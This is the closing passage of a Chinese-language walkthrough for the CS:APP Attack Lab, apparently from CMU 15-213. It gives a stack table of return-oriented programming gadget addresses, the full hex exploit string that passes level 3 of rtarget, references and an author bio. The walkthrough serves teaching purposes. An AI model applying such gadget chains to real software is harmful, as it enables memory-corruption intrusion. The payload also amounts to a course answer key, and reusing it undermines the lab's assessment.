| 96      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xd6 | G6 0x4019d6: lea (%rdi,%rsi,1),%rax                     |
| 88      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x27 | G5 0x401a27: %ecx -> %esi                               |
| 80      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x34 | G4 0x401a34: %edx -> %ecx                               |
| 72      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xdd | G3 0x4019dd: %eax -> %edx                               |
| 64      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x48 | 偏移量 120 - 48 = 72 (0x48)                             |
| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xab | G2 0x4019ab: (%rsp) -> %rax                             |
| 48      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | G1 0x4019c6: %rax -> %rdi 这个地址也是1.1里面保存的%rsp |
| 40      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x06 | G0 0x401a06: %rsp -> %rax                               |
| 32      | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack                                          |
| 24      | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
| 16      | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
| 8       | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
| 0       | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp                                            |


图中值得注意的几点
- 128 我们的cookie地址
- 48 我们把%rsp的值复制到%rax时栈的地址
- 64 这里保存了cookie到保存%rsp时两者的偏移量，也就是120 - 48 = 72 (0x48)

```bash
# cat result5 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
```

> 恭喜，当你走到这里的时候你已经堕入了**魔道**


## Reference

- Computer Systems: A Programmer's Perspective, 3/E (CS:APP3e) (http://csapp.cs.cmu.edu/3e/labs.html)
- 15-213: Intro to Computer Systems: Schedule for Fall 2015 (http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html)
- Linux and ASLR: kernel/randomize_va_space (https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/)
- cs:app 3.38 bufbomb (http://dev.poetpalace.org/?p=39)


## 关于作者

不怎么务正业的程序员，BUG制造者、CPU0杀手。从事过开发、运维、SRE、技术支持等多个岗位。原Oracle系统架构和性能服务团队成员，目前在腾讯从事运营系统开发。